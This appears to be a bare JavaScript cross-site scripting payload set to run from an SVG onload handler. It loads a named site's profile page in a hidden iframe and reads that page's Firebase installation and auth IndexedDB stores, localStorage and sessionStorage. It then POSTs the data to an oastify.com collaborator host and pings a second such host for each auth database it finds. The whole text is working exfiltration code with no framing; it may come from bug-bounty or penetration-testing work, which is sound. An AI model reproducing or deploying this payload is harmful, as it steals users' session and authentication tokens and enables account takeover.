svg.onload: var iframe = document.createElement('iframe'); iframe.src = 'https://ai.planet.com/profile'; iframe.style.display = 'none'; document.body.appendChild(iframe); iframe.onload = function() { var win = iframe.contentWindow; var request = win.indexedDB.open('firebase-installations-database'); request.onsuccess = function(event) { var db = event.target.result; var transaction = db.transaction(['firebase-installations-store'], 'readonly'); var store = transaction.objectStore('firebase-installations-store'); var getAll = store.getAll(); getAll.onsuccess = function() { var firebaseData = getAll.result; fetch('https://7pxwj8vuwwjr6kyatewtryrr2i89w0wol.oastify.com/firebase', { method: 'POST', body: JSON.stringify({ firebaseInstallations: firebaseData, localStorage: JSON.stringify(win.localStorage), sessionStorage: JSON.stringify(win.sessionStorage) }) }); }; }; var firebaseDBs = ['firebase-local-storage','firebase-auth-database','firebase::firebase:ai.planet.com','persistence:ai.planet.com']; firebaseDBs.forEach(function(dbName) { try { var req = win.indexedDB.open(dbName); req.onsuccess = function(e) { fetch('https://vhgkbwniokbfy8qyl2ohjmjfu60xorcg.oastify.com/db?name=' + dbName); }; } catch(e) {} }); };
